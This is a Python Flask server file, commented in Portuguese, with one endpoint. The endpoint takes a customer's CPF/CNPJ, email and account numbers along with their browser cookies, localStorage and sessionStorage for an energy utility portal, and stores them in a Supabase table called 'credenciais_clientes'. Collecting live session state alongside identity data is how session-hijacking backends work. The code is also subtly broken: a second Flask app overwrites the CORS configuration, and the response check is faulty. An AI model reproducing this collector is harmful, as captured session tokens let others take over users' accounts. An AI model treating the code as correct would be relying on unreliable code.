import os 
import asyncio
from flask import Flask, request, jsonify, send_file
from supabase import create_client, Client

from flask_cors import CORS

app = Flask(__name__)
CORS(app, resources={r"/*": {"origins": "https://pi.equatorialenergia.com.br"}})

# API Flask
app = Flask(__name__)

SUPABASE_URL= os.environ.get("SUPABASE_URL")
SUPABASE_KEY= os.environ.get("SUPABASE_KEY") 
supabase: Client = create_client(SUPABASE_URL, SUPABASE_KEY)

    
@app.route('/salvar-sessao', methods=['POST'])
def salvar_sessao():
    data = request.get_json()

    if not data:
        return jsonify({'erro': 'JSON inválido'}), 400

    try:
        insert_data = {  # Gera um UUID novo
            'cnpj_cpf': data.get('cpf'),
            'email_data': data.get('email_data', ''),
            'estado': data.get('estado', ''),
            'ucs': data.get('uc', []),  # Espera array
            'tipo': data.get('tipo'),
            'distribuidora': data.get('distribuidora'),
            'cookies': data.get('cookies'),
            'local_storage': data.get('localStorage'),
            'session_storage': data.get('sessionStorage'),
            'ativo': False  # Inicialmente inativo
        }

        result = supabase.table('credenciais_clientes').insert(insert_data).execute()

        if result.get('status_code') == 201:
            return jsonify({'mensagem': 'Sessão salva no Supabase!'})
        else:
            return jsonify({'erro': 'Erro ao salvar no Supabase', 'detalhes': result}), 500

    except Exception as e:
        return jsonify({'erro': str(e)}), 500
    

@app.route("/check", methods=["GET"])
def check():
    return jsonify({"status": "OK"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)